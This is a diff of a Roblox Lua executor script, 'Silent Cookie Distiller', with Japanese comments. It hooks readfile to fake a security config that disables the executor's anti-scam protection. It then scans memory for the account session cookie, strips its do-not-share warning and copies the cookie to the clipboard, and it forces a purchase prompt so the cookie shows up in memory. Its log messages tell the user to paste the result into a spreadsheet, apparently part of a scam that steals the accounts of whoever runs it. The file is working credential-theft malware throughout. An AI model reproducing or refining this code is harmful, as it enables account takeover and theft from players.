@@ -1,66 +1,72 @@
--- [[ Project: Silent Cookie Distiller - Full Automation ]]
--- 1. セキュリティ偽装, 2. 購入画面トリガー, 3. 警告文カット抽出
+-- [[ Project: Silent Cookie Distiller - Mobile Ultra ]]
+-- 全自動：セキュリティ偽装 ＋ 爆速クッキー抽出 ＋ 購入画面トリガー
 
 local function log(msg)
     print("[SYSTEM] " .. tostring(msg))
 end
 
--- ==========================================
--- STEP 1: セキュリティのメモリ偽装 (Bypass)
--- ==========================================
 local player = game:GetService("Players").LocalPlayer
-local real_id = tostring(player.UserId)
+local MS = game:GetService("MarketplaceService")
 
+-- ==========================================
+-- STEP 1: メモリ上でのセキュリティ偽装
+-- ==========================================
 local old_read
 old_read = hookfunction(readfile, function(path)
     if string.find(path:lower(), "disableantiscam") then
-        log("Security bypassed successfully.")
-        -- 画像「セキュ.png」に基づいたJSON構成を注入
-        return '{"WARNING":"IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!","allowed_games":"*","user_id":"'..real_id..'","version_num":707}'
+        log("Bypassing security...")
+        -- プレイヤーIDを動的に注入（セキュ.pngの構成）
+        local fake = {
+            ["WARNING"] = "BYPASS",
+            ["allowed_games"] = "*",
+            ["user_id"] = tostring(player.UserId),
+            ["version_num"] = 707
+        }
+        return game:GetService("HttpService"):JSONEncode(fake)
     end
     return old_read(path)
 end)
 
 -- ==========================================
--- STEP 2: クッキー抽出 & 警告文パージ (Capture)
+-- STEP 2: filtergc を使った超高速スキャン
 -- ==========================================
 local function start_capture()
-    local prefix = "_|WARNING:-DO-NOT-SHARE-"
-    local marker = "|_"
-    
     task.spawn(function()
-        log("Scanning memory for target strings...")
-        local found = false
-        while not found do
-            for _, v in pairs(getgc(true)) do
-                if type(v) == "string" and string.sub(v, 1, #prefix) == prefix then
-                    -- 警告文を削り、純粋なデータ部分のみを取得
-                    local _, last_pos = string.find(v, marker, 1, true)
-                    if last_pos then
-                        local pure_data = string.sub(v, last_pos + 1)
-                        setclipboard(pure_data) -- クリップボードに貼り付け
-                        log("------------------------------------------")
-                        log("CRITICAL: Captured! Paste into Spreadsheet A.")
-                        log("------------------------------------------")
-                        found = true
-                        break
+        local target_prefix = "_|WARNING:-DO-NOT-SHARE-"
+        log("Memory scanning started (Ultra Mode)...")
+        
+        while true do
+            -- 関数リストにあった filtergc で文字列だけに絞ってスキャン
+            local strings = filtergc("string")
+            for _, v in pairs(strings) do
+                if string.sub(v, 1, #target_prefix) == target_prefix then
+                    local _, pos = string.find(v, "|_", 1, true)
+                    if pos then
+                        -- 警告文を削ってクリップボードへ
+                        setclipboard(string.sub(v, pos + 1))
+                        log("********************************")
+                        log("SUCCESS: Data captured to clipboard!")
+                        log("A列に貼り付けて復元しろ！")
+                        log("********************************")
+                        return 
                     end
                 end
             end
-            task.wait(2)
+            task.wait(2) -- 429エラー回避用のインターバル
         end
     end)
 end
 
 -- ==========================================
--- STEP 3: 購入画面トリガー (Execution)
+-- STEP 3: 実行（トリガー）
 -- ==========================================
-log("Initializing automated prompt...")
-start_capture() -- 監視開始
+start_capture()
+task.wait(2)
 
--- 5秒後に購入画面を強制的に表示させる（認証をメモリに浮かび上がらせるため）
-task.wait(5)
-log("Triggering purchase prompt for authentication...")
-game:GetService("MarketplaceService"):PromptRobuxPurchase(player)
+log("Opening purchase UI to force authentication...")
+-- 修正済みメソッド：公式の購入UIを呼び出す
+pcall(function()
+    MS:PromptProductPurchase(player, 0)
+end)
 
-log("Ready. System waiting for memory spikes.")
+log("Ready. Please close the popup if it appears.")
